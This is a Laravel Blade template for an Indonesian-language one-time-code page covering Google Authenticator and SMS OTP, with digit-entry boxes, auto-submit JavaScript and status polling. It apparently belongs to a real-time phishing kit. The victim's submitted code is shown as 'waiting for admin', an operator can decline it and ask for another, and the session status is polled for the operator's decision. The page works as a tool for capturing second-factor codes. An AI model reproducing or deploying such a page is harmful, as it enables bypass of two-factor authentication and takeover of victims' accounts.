@extends('layouts.app')

@section('title', $isAuth ? 'Authenticator' : 'OTP Verification')

@section('body')
<div class="shell">
    <div class="card" style="text-align:center;max-width:440px">
        <p class="eyebrow">{{ $isAuth ? 'Google Authenticator' : 'SMS OTP' }}</p>

        @if ($review)
            <h1>Kode terkirim</h1>
            <p class="sub">Kode <strong class="mono" style="color:#fbbf24;font-size:1.4rem">{{ $session->otp_code }}</strong> menunggu admin.</p>
            <div class="wait-dot amber" aria-hidden="true"></div>
            <p class="muted" id="wait-status" style="margin-top:1rem;font-size:.9rem">Status: review…</p>
        @else
            <h1>Masukkan kode 6 digit</h1>

            @if ($session->otp_declined)
                <div class="error" style="text-align:left">Kode ditolak. Masukkan kode yang benar.</div>
            @endif

            @if ($isAuth)
                <p class="sub">Buka aplikasi <strong>Google Authenticator</strong> lalu masukkan kode 6 digit.</p>
            @else
                <p class="sub">
                    Kami mengirim OTP ke nomor yang berakhiran
                    <strong class="mono" style="color:#5eead4;font-size:1.15rem">****{{ $session->phone_last4 }}</strong>
                </p>
            @endif

            @if ($errors->any())
                <div class="error" style="text-align:left">{{ $errors->first() }}</div>
            @endif

            <form method="POST" action="{{ route('otp.store') }}" id="otp-form">
                @csrf
                <input type="hidden" name="otp" id="otp-value" value="{{ old('otp') }}">
                <div class="otp-boxes">
                    @for ($i = 0; $i < 6; $i++)
                        <input class="otp-digit" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="1" pattern="[0-9]" aria-label="Digit {{ $i + 1 }}">
                    @endfor
                </div>
                <button class="btn" type="submit" style="margin-top:1.25rem">Kirim Kode</button>
            </form>
            <p class="muted" id="wait-status" style="margin-top:1rem;font-size:.85rem">Status: {{ $session->status }}…</p>
        @endif
    </div>
</div>

<style>
    .otp-boxes { display: flex; justify-content: center; gap: .55rem; margin-top: .25rem; }
    .otp-digit {
        width: 3rem; height: 3.4rem; text-align: center; font-size: 1.45rem; font-weight: 700;
        border: 1px solid var(--border); background: #0c1117; color: var(--text); border-radius: 12px;
    }
    .otp-digit:focus {
        outline: 2px solid color-mix(in srgb, var(--accent) 55%, transparent);
        border-color: var(--accent);
    }
    .wait-dot {
        width: 14px; height: 14px; margin: 1.25rem auto 0; border-radius: 50%;
        background: #3b82f6; animation: pulse 1.2s ease-in-out infinite;
    }
    .wait-dot.amber { background: #f59e0b; }
    @keyframes pulse {
        0%, 100% { opacity: .35; transform: scale(.85); }
        50% { opacity: 1; transform: scale(1.1); }
    }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
</style>

@unless ($review)
<script>
(() => {
    const inputs = [...document.querySelectorAll('.otp-digit')];
    const hidden = document.getElementById('otp-value');
    const form = document.getElementById('otp-form');
    const sync = () => { hidden.value = inputs.map(i => i.value.replace(/\D/g, '')).join(''); };
    const fill = (start, chars) => {
        for (let i = 0; i < chars.length && start + i < inputs.length; i++) inputs[start + i].value = chars[i];
        sync();
        inputs[Math.min(start + chars.length, inputs.length - 1)].focus();
        if (hidden.value.length === 6) form.requestSubmit();
    };
    if (hidden.value) fill(0, hidden.value.replace(/\D/g, '').slice(0, 6).split(''));
    inputs.forEach((input, idx) => {
        input.addEventListener('input', (e) => {
            const v = e.target.value.replace(/\D/g, '');
            if (v.length > 1) return fill(idx, v.split(''));
            e.target.value = v.slice(-1); sync();
            if (v && idx < inputs.length - 1) inputs[idx + 1].focus();
            if (hidden.value.length === 6) form.requestSubmit();
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && idx > 0) inputs[idx - 1].focus();
        });
        input.addEventListener('paste', (e) => {
            e.preventDefault();
            fill(0, (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6).split(''));
        });
    });
    inputs[0]?.focus();
})();
</script>
@endunless

@include('partials.status-poll', ['current' => $session->status])
@endsection
